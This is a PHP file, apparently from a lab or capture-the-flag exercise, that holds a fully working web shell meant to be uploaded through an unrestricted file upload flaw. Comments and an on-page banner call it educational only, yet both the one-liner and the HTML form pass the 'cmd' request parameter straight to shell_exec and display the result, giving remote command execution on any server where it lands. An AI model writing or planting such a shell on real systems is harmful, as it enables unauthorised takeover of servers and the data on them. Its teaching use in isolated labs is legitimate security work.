<?php
/**
 * ============================================================
 * EXAMPLE WEBSHELL – EDUCATIONAL DEMONSTRATION ONLY
 *
 * This file shows what an attacker would upload to exploit the
 * unrestricted file upload vulnerability in index.php.
 *
 * DO NOT USE THIS FOR UNAUTHORISED ACCESS.
 * Only run this inside an isolated lab / CTF environment.
 * ============================================================
 */

// A one-liner PHP webshell – the classic proof-of-concept
// An attacker uploads this as "shell.php", then visits:
//   http://target/uploads/shell.php?cmd=id
//
// The server executes the OS command and returns the output.

if (isset($_GET['cmd'])) {
    // VULNERABILITY: unsanitised user input passed directly to a shell
    echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Webshell – Demo Only</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 24px; }
        form { margin-bottom: 20px; }
        input[type=text] { width: 400px; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; }
        button { padding: 8px 16px; background: #0f0; color: #111; border: none; cursor: pointer; font-weight: bold; }
        pre { background: #000; padding: 16px; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
        .warn { background: #4a1010; color: #e57373; border: 1px solid #c0392b; padding: 12px; margin-bottom: 20px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="warn">
        &#9888; DEMO WEBSHELL – educational use only. Do not deploy on production systems.
    </div>
    <h2>Remote Command Execution (via unrestricted file upload)</h2>
    <form method="GET">
        <input type="text" name="cmd" value="<?= htmlspecialchars($_GET['cmd'] ?? 'id') ?>" placeholder="OS command">
        <button type="submit">Execute</button>
    </form>
    <?php if (isset($_GET['cmd'])): ?>
        <pre><?= htmlspecialchars(shell_exec($_GET['cmd'] ?? '')) ?></pre>
    <?php endif; ?>
</body>
</html>
